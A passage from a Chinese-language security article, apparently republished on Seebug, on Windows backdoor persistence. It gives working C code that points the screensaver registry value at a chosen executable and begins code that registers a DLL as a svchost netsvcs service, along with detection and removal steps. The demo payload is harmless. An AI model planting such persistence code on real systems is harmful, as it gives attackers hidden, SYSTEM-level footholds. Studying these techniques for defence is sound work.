        DWORD key_value_type;
        BYTE shell_value_buffer[MAX_PATH * 2]; 
        DWORD value_buffer_size = sizeof(shell_value_buffer) ;
        HKEY desktop_key = NULL; 
        DWORD set_value_size;
        BYTE set_buffer[MAX_PATH]; 
        rcode = RegOpenKeyEx(HKEY_CURRENT_USER, _TEXT("Control Panel\\Desktop"),
            NULL, KEY_ALL_ACCESS, &desktop_key);
        if (rcode != ERROR_SUCCESS)
        {
            goto ERROR_EXIT;
        }
        //
        value_buffer_size = sizeof(shell_value_buffer);
        rcode = RegQueryValueEx(desktop_key,_TEXT("ScreenSaveActive"), NULL, &key_value_type, shell_value_buffer, &value_buffer_size);
        if (rcode != ERROR_SUCCESS)
        {
            //找不到指定的键值，说明未开启屏保功能。
            if (rcode == 0x2)   
            {
                //设置待启动程序路径
                lstrcpy((TCHAR*)set_buffer, _TEXT("C:\\topsec.exe"));
                set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(desktop_key, _TEXT("SCRNSAVE.EXE"), NULL, REG_SZ, set_buffer, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
                //设置启动时间，60秒无鼠标键盘活动后启动屏保
                lstrcpy((TCHAR*)set_buffer, _TEXT("60"));
                set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(desktop_key, _TEXT("ScreenSaveTimeOut"), NULL, REG_SZ, set_buffer, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
                //开启屏保功能
                lstrcpy((TCHAR*)set_buffer, _TEXT("1"));
                set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(desktop_key, _TEXT("ScreenSaveActive"), NULL, REG_SZ, set_buffer, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
            }
            else
            {
                goto ERROR_EXIT;
            }
        }
        else
        {
            //有键值存在,已开启屏幕保护功能，需要保存原设置，驻留程序按实际情况启动原屏保
            if(lstrcmp(_TEXT("1"), (TCHAR*)shell_value_buffer) == NULL)
            {
                //读取原值并保存
                value_buffer_size = sizeof(shell_value_buffer);
                rcode = RegQueryValueEx(desktop_key,_TEXT("SCRNSAVE.EXE"), NULL, &key_value_type, shell_value_buffer, &value_buffer_size);
                if(rcode != ERROR_SUCCESS && rcode != 0x2)
                {
                    goto ERROR_EXIT;
                }
                //当ScreenSaveActive值为1 而又不存在SCRNSAVE.EXE时，不备份。
                if(rcode != 0x2)
                {
                    rcode = RegSetValueEx(desktop_key, _TEXT("SCRNSAVE.EXE.BAK"), NULL, REG_SZ, shell_value_buffer, value_buffer_size);
                    if (rcode != ERROR_SUCCESS)
                    {
                        goto ERROR_EXIT;
                    }
                }
                //改为待启动程序
                lstrcpy((TCHAR*)set_buffer, _TEXT("C:\\topsec.exe"));
                set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(desktop_key, _TEXT("SCRNSAVE.EXE"), NULL, REG_SZ, set_buffer, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
                //判断是否有配置屏保启动时间
                value_buffer_size = sizeof(shell_value_buffer);
                rcode = RegQueryValueEx(desktop_key,_TEXT("ScreenSaveTimeOut"), NULL, &key_value_type, shell_value_buffer, &value_buffer_size);
                if(rcode != ERROR_SUCCESS && rcode == 0x2)
                {
                    //设置启动时间,60秒无鼠标键盘活动后启动屏保
                    lstrcpy((TCHAR*)set_buffer, _TEXT("60"));
                    set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                    rcode = RegSetValueEx(desktop_key, _TEXT("ScreenSaveTimeOut"), NULL, REG_SZ, set_buffer, set_value_size);
                    if (rcode != ERROR_SUCCESS)
                    {
                        goto ERROR_EXIT;
                    }
                }
            }
            else if(lstrcmp(_TEXT("0"), (TCHAR*)shell_value_buffer) == NULL)
            {
                //该值为0，未开启屏幕保护功能
                //设置待启动程序路径
                lstrcpy((TCHAR*)set_buffer, _TEXT("C:\\topsec.exe"));
                set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(desktop_key, _TEXT("SCRNSAVE.EXE"), NULL, REG_SZ, set_buffer, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
                //设置启动时间,60秒无鼠标键盘活动后启动屏保
                lstrcpy((TCHAR*)set_buffer, _TEXT("60"));
                set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(desktop_key, _TEXT("ScreenSaveTimeOut"), NULL, REG_SZ, set_buffer, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
                //开启屏保功能
                lstrcpy((TCHAR*)set_buffer, _TEXT("1"));
                set_value_size = lstrlen((TCHAR*)set_buffer) * sizeof(TCHAR) + sizeof(TCHAR);
                rcode = RegSetValueEx(desktop_key, _TEXT("ScreenSaveActive"), NULL, REG_SZ, set_buffer, set_value_size);
                if (rcode != ERROR_SUCCESS)
                {
                    goto ERROR_EXIT;
                }
            }
        }
        ret = TRUE;
    ERROR_EXIT:
        if (desktop_key != NULL)
        {
            RegCloseKey(desktop_key);
            desktop_key = NULL;
        }
        return ret;
    }
其中topsec.exe 代码如下：
    #include "stdafx.h"
    #include 
    #include 
    int _tmain(int argc, _TCHAR* argv[])
    {
        int i = 10000;
        while(i)
        {
            i--;
            Sleep(1000);
            OutputDebugString(_TEXT("Hello Topsec!!!"));
        }
        return 0;
    }
## **运行效果图**
当该用户因鼠标键盘未操作触发屏保程序运行，我们的程序就被启动了，运行后的效果及注册表键值情况如下图所示：
![
](https://images.seebug.org/content/images/2019/08/a62755e6-53d1-42c6-bc75-cff25ee19e48.png-w331s)
## **检查及清除方法**
1、 检查注册表路径HKCU\Control Panel\Desktop，删除包含来历不明的屏保程序配置信息。
2、 通过组策略以强制用户使用专用的屏幕保护程序，或者是通过组策略完全禁用屏保功能。
# **创建新服务**
## **原理及代码介绍**
在Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有SYSTEM权限，非常适合用于后门持久化。我们可以将EXE文件注册为服务，也可以将DLL文件注册为服务，本文这一部分将以DLL类型的服务为例，介绍安装及检查的思路。
相信不论是安全从业者还是普通用户都听说过svchost
进程，系统中存在不少Svchost进程，有的还会占用很高的cpu，究竟这个Svchost是何方神圣？是恶意代码还是正常程序？相信不少人用户发出过这样的疑问。实际上Svchost是一个正常的系统程序，只不过他是DLL类型服务的外壳程序，容易被恶意代码所利用。
Service Host (Svchost.exe) 是共享服务进程，作为DLL文件类型服务的外壳，由Svchost程序加载指定服务的DLL文件。
在Windows 10 1703 以前，不同的共享服务会组织到关联的Service host组中，每个组运行在不同的Service
Host进程中。这样如果一个Service Host发生问题不会影响其他的Service
Host。Windows通过将服务与匹配的安全性要求相结合，来确定Service Host Groups，一部分默认的组名如下：
· Local Service
· Local Service No Network
· Local Service Network Restricted
· Local System
· Local System Network Restricted
· Network Service
而从Windows 10 Creators Update（版本1703）开始，先前分组的服务将被分开，每个服务将在其自己的SvcHost
Host进程中运行。对于运行Client Desktop SKU的RAM 超过3.5 GB的系统，此更改是自动的。在具有3.5
GB或更少内存的系统上，将继续将服务分组到共享的SvcHost进程中。
此设计更改的好处包括：
· 通过将关键网络服务与主机中的其他非网络服务的故障隔离，并在网络组件崩溃时添加无缝恢复网络连接的能力，提高了可靠性。
· 通过消除与隔离共享主机中的行为不当服务相关的故障排除开销，降低了支持成本。
· 通过提供额外的服务间隔离来提高安全性
· 通过允许每项服务设置和权限提高可扩展性
· 通过按服务CPU，I / O和内存管理改进资源管理，并增加清晰的诊断数据（报告每个服务的CPU，I / O和网络使用情况）。
在系统启动时，Svchost.exe会检查注册表以确定应加载哪些服务，注册表路径如下：HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Svchost .在笔者的电脑上，如下图：
![
](https://images.seebug.org/content/images/2019/08/622c9f6f-40e6-4db2-aea2-6ad3b177ea32.png-w331s)
而在注册表HKLM\SYSTEM\CurrentControlSet\Services，保存着注册服务的相关信息，以netsvcs组中的AeLoookupSvc为例，我们看一下相关信息：
![
](https://images.seebug.org/content/images/2019/08/0f449f88-6641-4e96-8d5f-080664b3052e.png-w331s)
该路径下保存了服务的ImagePath、Description、DisplayName等信息，当然还包含一些服务的其他配置，这里不一一列举。如下的代码演示了如何添加一个利用Svchost启动的DLL共享服务。
    BOOL search_svchost_service_name(TCHAR* service_name_buffer, PDWORD buffer_size)
    {
        BOOL bRet = FALSE;
        int rc = 0;
        HKEY hkRoot;
        BYTE buff[2048];
        TCHAR* ptr = NULL;
        DWORD type;
        DWORD size = sizeof(buff);
        int i = 0;
        bool bExist = false;
        TCHAR tmp_service_name[50];
        TCHAR* pSvchost = _TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost");
        rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
        if(ERROR_SUCCESS != rc)
        {
            return NULL;
        }
        rc = RegQueryValueEx(hkRoot, _TEXT("netsvcs"), 0, &type, buff, &size);
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
        {
            RegCloseKey(hkRoot);
            return NULL;
        }
        do
        {   
            wsprintf(tmp_service_name, _TEXT("netsvcs_0x%d"), i);
            for(ptr = (TCHAR*)buff; *ptr; ptr = _tcschr(ptr, 0)+1)
            {
                if (lstrcmpi(ptr, tmp_service_name) == 0)
                {   
                    bExist = true;
                    break;
                }
            }
            if (bExist == false)
            {
                break;
            }
            bExist = false;
            i++;
        } while(1);
        memcpy(buff + size - sizeof(TCHAR), tmp_service_name, lstrlen(tmp_service_name) * sizeof(TCHAR) + sizeof(TCHAR));
        rc = RegSetValueEx(hkRoot, _TEXT("netsvcs"), 0, REG_MULTI_SZ, buff, size + lstrlen(tmp_service_name) * sizeof(TCHAR) + sizeof(TCHAR));
        if(ERROR_SUCCESS != rc)
        {
            goto ERROE_EXIT;
        }
        if (bExist == false)
        {
            lstrcpyn(service_name_buffer, tmp_service_name, *buffer_size);
            *buffer_size =lstrlen(service_name_buffer);
        }
        bRet = TRUE;
    ERROE_EXIT:
        if (hkRoot != NULL)
        {
            RegCloseKey(hkRoot);
            hkRoot = NULL;
        }
        return bRet;
    }
    BOOL install_service(LPCTSTR full_dll_path, TCHAR* service_name_buffer, PDWORD buffer_size)
    {
        BOOL bRet = FALSE;
        int rc = 0;
        HKEY hkRoot = HKEY_LOCAL_MACHINE;
        HKEY hkParam = 0;
        SC_HANDLE hscm = NULL;
        SC_HANDLE schService = NULL;
        TCHAR   strModulePath[MAX_PATH];
        TCHAR   strSysDir[MAX_PATH];
        DWORD   dwStartType = 0;
        BYTE buff[1024];
        DWORD type;
        DWORD size = sizeof(buff);
        TCHAR* binary_path = _TEXT("%SystemRoot%\\System32\\svchost.exe -k netsvcs");
        TCHAR* ptr;
        TCHAR* pSvchost = _TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost");
        rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
        if(ERROR_SUCCESS != rc)
        {
            goto ERROR_EXIT;